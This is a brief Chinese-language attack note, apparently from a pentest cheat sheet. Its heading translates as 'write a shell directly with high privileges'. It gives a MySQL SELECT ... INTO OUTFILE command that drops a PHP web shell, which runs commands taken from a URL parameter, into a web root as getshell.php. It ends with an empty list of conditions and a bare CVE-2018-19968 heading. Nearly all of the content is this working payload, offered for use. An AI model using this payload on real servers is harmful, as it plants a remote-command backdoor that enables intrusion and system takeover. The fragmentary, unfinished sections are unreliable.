# 高权限直接写shell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php";
```
需要满足的条件
- 
# CVE-2018-19968
